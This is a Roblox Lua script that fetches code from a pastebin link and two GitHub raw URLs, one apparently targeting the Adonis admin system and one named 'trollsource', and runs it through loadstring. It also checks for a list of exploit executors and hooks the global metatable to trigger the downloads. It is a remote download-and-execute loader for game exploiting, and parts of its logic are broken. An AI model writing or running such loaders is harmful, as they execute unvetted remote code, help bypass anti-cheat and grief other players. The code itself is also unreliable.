-- Function to execute a script from a URL
local function executeScriptFromURL(url)
    local HttpService = game:GetService("HttpService")
    local success, response = pcall(function() return HttpService:GetAsync(url) end)

    if success then
        local loadSuccess, scriptFunc = pcall(loadstring(response))
        if loadSuccess then
            scriptFunc() -- Execute the fetched Lua script
        else
            warn("Error loading script from URL: " .. scriptFunc)
        end
    else
        warn("Failed to fetch script from URL: " .. response)
    end
end

-- URLs for scripts
local pastebinURL = "https://pastebin.com/raw/AnEbCekx"
local githubURL = "https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua"
local trollSourceURL = "https://raw.githubusercontent.com/John142-dot/flexurfpsandping/main/trollsource"

-- Function to execute all scripts from URLs
local function executeAllScripts()
    executeScriptFromURL(pastebinURL)
    executeScriptFromURL(githubURL)
    executeScriptFromURL(trollSourceURL)
end

-- Known executors list
local knownExecutors = {
    "delta",
    "codex",
    "wave",
    "solara",
    "fluxus",
    "vegax",
    "cryptic",
    "cacti",
    "appleware"
}

-- Function to detect executors
local function detectExecutors()
    local detectedExecutor = nil

    -- Replace this with actual detection logic
    local success, result = pcall(function()
        -- Example detection: checking a global flag or a known property
        if _G and _G.SomeExecutorFlag then
            return _G.SomeExecutorFlag
        end
        return nil
    end)

    if success and result then
        -- Check if result matches any known executor names
        for _, name in ipairs(knownExecutors) do
            if string.match(result:lower(), name) then
                detectedExecutor = name
                break
            end
        end
    end

    return detectedExecutor
end

-- Advanced Hook Function with Unique Lua Syntax
local function weirdHook(target, callback, executeScript)
    -- Save the original method
    local original = getmetatable(_G)[target]
    
    if original then
        -- Define a metatable with custom metamethods
        local mt = {}
        mt.__index = function(t, k)
            if k == target then
                return function(...)
                    local args = {...}
                    local result
                    -- Safely call the original method if it's a function
                    if type(original) == "function" then
                        result = original(t, k)(...)
                    end
                    -- Call the callback with the result and arguments
                    callback(result, table.unpack(args))
                    
                    -- Execute the script after detection
                    if executeScript then
                        executeScript()
                    end
                    return result
                end
            end
            return rawget(t, k)
        end
        setmetatable(_G, mt)
    else
        warn("Original method not found.")
    end
end

-- Define the callback function for the hook
local function hookCallback(result, ...)
    -- Detect executors
    local detectedExec = detectExecutors()
    
    if detectedExec then
        print("Detected Executor: " .. detectedExec)
        executeAllScripts()
    else
        print("No known executor detected.")
    end
    
    -- Continue with original behavior
    return result(...)
end

-- Apply Hook with Advanced Syntax
weirdHook("__index", hookCallback, executeAllScripts)

-- The hook will activate when the target method is called
